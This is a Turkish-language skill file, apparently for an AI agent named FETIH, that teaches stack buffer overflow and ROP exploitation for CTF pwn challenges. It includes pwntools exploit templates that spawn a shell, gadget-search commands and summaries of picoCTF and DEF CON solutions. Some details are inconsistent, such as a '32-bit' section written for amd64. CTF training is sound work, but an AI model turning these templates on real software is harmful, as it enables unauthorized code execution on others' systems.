---
name: buffer-overflow-rop
description: Stack buffer overflow + ROP chain ile kontrol akışı ele geçirme — NX etkin, canary yok senaryoları için eksiksiz tarif
tags: [ctf, pwn, buffer-overflow, rop, shellcode, stack-smashing, nx, gadget, cyclic, pwntools]
triggers:
  - "gets() kullanılmış"
  - "stack buffer overflow"
  - "NX enabled, no canary"
  - "cyclic pattern"
  - "segfault offset"
  - "checksec"
  - "ROPgadget"
  - "jmp esp"
  - "jmp rsp"
  - "ret2plt"
  - "gadget zinciri"
  - "EIP/RIP kontrolü"
  - "offset hesaplama"
difficulty: medium
category: pwn
solved_challenges:
  - "picoCTF 2024 - ROPfu"
  - "picoCTF 2024 - handoff"
  - "DEF CON CTF Qualifier 2023 - IFUCKUP"
adapted_for: fetih
---

# Buffer Overflow + ROP Chain

Stack tabanlı buffer overflow ile ROP (Return-Oriented Programming) zinciri kurarak kontrol akışını ele geçirme tekniği.

## Ne Zaman Kullan

Binary'de şunlardan birini görürsen bu yolu dene:

- `gets()`, `strcpy()`, `scanf("%s")`, `read()` sabit tampon boyutuyla kullanılmış
- `checksec` çıktısında **NX enabled** (No eXecute) var ama **Canary: No** veya **Partial RELRO**
- `ROPgadget --binary ./binary` ile `jmp esp`, `jmp rax`, `pop rdi; ret` gibi gadget'lar mevcut
- Segfault alıyorsun ve EIP/RIP kontrolü var gibi görünüyor
- 32-bit veya 64-bit ELF, static veya dinamik bağlı

## Checksec Analizi

```bash
checksec --file=./binary
```

| Özellik | Sonuç | Anlamı |
|---------|-------|--------|
| NX enabled | Kötü | Stack'e shellcode yazıp çalıştıramazsın → ROP gerekli |
| NX disabled | İyi | Klasik shellcode stack'e yazılıp çalıştırılabilir |
| Canary: No | İyi | Stack canary koruması yok, overflow düz geçer |
| Canary: Yes | Kötü | Canary'yi sızdırman ya da brute-force etmen gerekir |
| PIE: No | İyi | Binary adresleri sabittir, doğrudan kullanabilirsin |
| PIE: Yes | Kötü | ASLR + PIE birleşimi → önce adres sızdırman gerekir |
| RELRO: Partial | İyi | GOT yazılabilir → GOT overwrite mümkün |
| RELRO: Full | Kötü | GOT salt okunur |

## Offset Bulma

### pwntools cyclic ile (önerilen):

```python
from pwn import *

# 1. Adım: cyclic pattern üret ve gönder
io = process('./binary')
io.sendline(cyclic(200))
io.wait()

# 2. Adım: core dump'tan EIP/RIP değerini al
core = Coredump('./core')
# 32-bit:
offset = cyclic_find(core.eip)
# 64-bit:
offset = cyclic_find(core.read(core.rsp - 8, 4))
print(f"Offset: {offset}")
```

### gdb-pwndbg ile manuel:

```bash
gdb ./binary
(gdb) run <<< $(python3 -c "from pwn import *; print(cyclic(200))")
# Segfault sonrası:
(gdb) info registers
# EIP/RIP değerini not al, sonra:
python3 -c "from pwn import *; print(cyclic_find(0x61616174))"
```

## ROP Gadget Bulma

```bash
# Temel gadget'lar
ROPgadget --binary ./binary | grep -E "jmp (esp|rsp|eax|rax)"
ROPgadget --binary ./binary | grep "pop rdi"
ROPgadget --binary ./binary | grep "pop rsi"
ROPgadget --binary ./binary | grep ": ret$"

# ropper ile alternatif
ropper -f ./binary --search "jmp rsp"
```

## Exploit Kodu — Tam Çalışan Şablon

### 32-bit NX+NOCANARY — ROPfu Tarzı (jmp eax gadget):

```python
#!/usr/bin/env python3
from pwn import *

# Binary ve bağlam
context.arch = 'i386'
context.log_level = 'info'

elf = ELF('./binary')
io = process('./binary')

# 1. Gadget'ları bul
jmp_eax = 0x08049abc   # ROPgadget ile buldun → jmp eax

# 2. Shellcode (execve /bin/sh, 32-bit)
shellcode = asm(shellcraft.sh())

# 3. Payload: [shellcode][padding][jmp_eax adresi]
offset = 28            # cyclic ile bulduğun offset
padding = offset - len(shellcode)
payload  = shellcode
payload += b'A' * padding
payload += p32(jmp_eax)

# 4. Gönder
io.sendlineafter(b'Input:', payload)
io.interactive()
```

### 32-bit handoff Tarzı (jmp rax + sub rsp gadget):

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
elf = ELF('./binary')
io = process('./binary')

jmp_rax     = 0x401234   # jmp rax gadget
sub_rsp_jmp = asm('sub rsp, 0x2a0; jmp rsp')   # stack pivot
shellcode   = asm(shellcraft.sh())

# feedback tamponu → sub rsp shellcode
io.sendafter(b'Feedback:', sub_rsp_jmp.ljust(32, b'\x90'))

# overflow → jmp rax
offset = 40
payload  = b'A' * offset
payload += p64(jmp_rax)
io.sendafter(b'Name:', payload)

io.interactive()
```

### 64-bit ROP zinciri — ret2win:

```python
#!/usr/bin/env python3
from pwn import *

elf = ELF('./binary')
io  = process('./binary')

POP_RDI = 0x401293   # pop rdi; ret
RET     = 0x40101a   # ret (stack alignment için)
WIN     = elf.sym['win']   # varsa win() fonksiyonu

offset = 72
payload  = b'A' * offset
payload += p64(RET)         # 16-byte hizalama (Ubuntu ABI)
payload += p64(POP_RDI)
payload += p64(next(elf.search(b'/bin/sh\x00')))
payload += p64(elf.plt['system'])

io.sendlineafter(b'> ', payload)
io.interactive()
```

## Gerçek Challenge Referansları

### picoCTF 2024 — ROPfu (medium)

**Durum:** 32-bit ELF, NX enabled, no canary, no PIE. `gets()` overflow.

**Çözüm adımları:**
1. `checksec` → NX var, canary yok
2. `ROPgadget --binary ./vuln | grep "jmp eax"` → gadget bulundu
3. cyclic(200) ile offset = 28 bulundu
4. 2-byte `jmp esp` shellcode buffer başına yerleştirildi
5. `jmp eax` ile buffer'a atlandı, oradan `jmp esp` → stack shellcode çalıştı

**Writeup:** https://medium.com/@AdvDebugy/picoctf-ropfu-ctf-writeup-5f25a033f0cf

### picoCTF 2024 — handoff (medium)

**Durum:** 32-byte overflow, `feedback[7]=\0` truncation var.

**Çözüm:** `jmp rax` gadget ile feedback buffer'a atlandı, orada `sub rsp,0x2a0; jmp rsp` yazılı, stack shellcode → shell.

**Writeup:** https://medium.com/@z.ishan_Ansari/handoff-f6ec74face4d

### DEF CON CTF Qualifier 2023 — IFUCKUP (hard)

**Durum:** 32-bit ELF, kod ve stack sürekli F₂-lineer PRNG ile relocation yapıyor.

**Çözüm:** 512×512 F₂ lineer cebir sistemi Sage ile çözüldü, PRNG state kırıldı, relocation-aware breakpoint sonrası `/bin/sh` ROP.

**Araçlar:** Ghidra, SageMath, z3, GDB Python API, pwntools

**Writeup:** https://www.kalmarunionen.dk/writeups/2023/defcon_quals/ifuckup/

## Yaygın Hatalar

- **Stack hizalama (64-bit):** `system()` çağrısından önce ekstra `ret` gadget koy — RSP 16-byte hizalı olmalı, aksi hâlde `movaps` SIGSEGV verir
- **Kısmi overwrite:** PIE açıkken son 1-2 byte'ı overwrite edip gadget avlamak işe yarıyor (ASLR page-aligned)
- **gets() vs read():** `gets()` null-byte'ta durmaz, `read()` belirtilen n'e kadar okur — padding hesaplarken karıştırma
- **b'\x0a' (newline) sorunları:** sendline ekstra `\n` ekler; sendafter/send kullan, sonra elle `\n` gönder
- **Canary var sanmak:** libc leak olmadan canary'yi bypass edemezsin; önce `checksec` çalıştır
- **32-bit `ret` hizalama:** 32-bit'te hizalama sorunu yok; ekstra `ret` ekleme

<!--
  ⚔ Bu skill FETIH AI Agent icin gelistirilmistir — https://github.com/MustafaKemal0146/fetih
  Yetkisiz kullanim/kopyalama tespit edilebilir.
  hash: a64ecdeda5e76b0c
-->

